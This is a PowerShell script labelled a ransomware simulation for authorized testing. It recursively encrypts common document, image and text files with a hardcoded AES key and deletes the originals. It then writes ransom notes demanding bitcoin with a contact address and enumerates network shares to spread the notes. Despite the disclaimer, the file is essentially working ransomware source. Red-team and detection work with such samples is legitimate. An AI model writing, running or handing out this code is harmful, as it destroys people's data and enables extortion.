# Ransomware Simulation Script - Security Evaluation Only
# This script is for authorized security testing purposes only

param(
    [string]$TargetPath = "C:\Test",
    [string]$LogFile = "C:\Windows\Temp\encryption_log.txt",
    [int]$ThreadCount = 4
)

# AES Encryption Key (hardcoded for demo - real malware would use key exchange)
$AESKey = [System.Text.Encoding]::UTF8.GetBytes("ThisIsASampleKey1234567890123456")
$AESIV = [System.Text.Encoding]::UTF8.GetBytes("InitialVector123")

function Encrypt-File {
    param([string]$FilePath)
    
    try {
        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $AESKey
        $aes.IV = $AESIV
        $encryptor = $aes.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
        
        [System.IO.File]::WriteAllBytes($FilePath + ".encrypted", $encryptedData)
        Remove-Item $FilePath -Force
        
        # Log successful encryption
        "$(Get-Date) - Encrypted: $FilePath" | Out-File -FilePath $LogFile -Append
        return $true
    }
    catch {
        "$(Get-Date) - Failed: $FilePath - $_" | Out-File -FilePath $LogFile -Append
        return $false
    }
}

function Create-RansomNote {
    param([string]$Directory)
    
    $noteContent = @"
YOUR FILES HAVE BEEN ENCRYPTED!
To decrypt your files, send 0.1 BTC to: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
Contact: decryptor@onionmail.com
DO NOT MODIFY OR RENAME FILES!
"@
    
    $notePath = Join-Path $Directory "READ_ME_FOR_DECRYPT.txt"
    $noteContent | Out-File -FilePath $notePath
}

function Discover-NetworkShares {
    # Find available network shares using WMI
    $shares = Get-WmiObject -Class Win32_Share -Filter "Type=0" | Select-Object -ExpandProperty Name
    return $shares | Where-Object { $_ -notlike "*$" }  # Filter out admin shares
}

# Main execution
Write-Host "Starting encryption process..." -ForegroundColor Red

# Process local files
$files = Get-ChildItem -Path $TargetPath -Recurse -File -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf,*.jpg,*.txt -ErrorAction SilentlyContinue

# Use parallel processing for speed improvement
$files | ForEach-Object -Parallel {
    $scriptBlock = {
        param($file)
        . $using:function:Encrypt-File
        Encrypt-File -FilePath $file.FullName
    }
    
    Start-ThreadJob -ScriptBlock $scriptBlock -ArgumentList $_ -ThrottleLimit $ThreadCount
} | Wait-Job | Receive-Job

# Create ransom notes in each directory
Get-ChildItem -Path $TargetPath -Directory -Recurse | ForEach-Object {
    Create-RansomNote -Directory $_.FullName
}

# Attempt to spread to network shares
$networkShares = Discover-NetworkShares
foreach ($share in $networkShares) {
    try {
        $sharePath = "\\$env:COMPUTERNAME\$share"
        if (Test-Path $sharePath) {
            Create-RansomNote -Directory $sharePath
            "$(Get-Date) - Infected network share: $sharePath" | Out-File -FilePath $LogFile -Append
        }
    }
    catch {
        # Silent fail on network errors
    }
}

Write-Host "Encryption complete. Check $LogFile for details." -ForegroundColor Yellow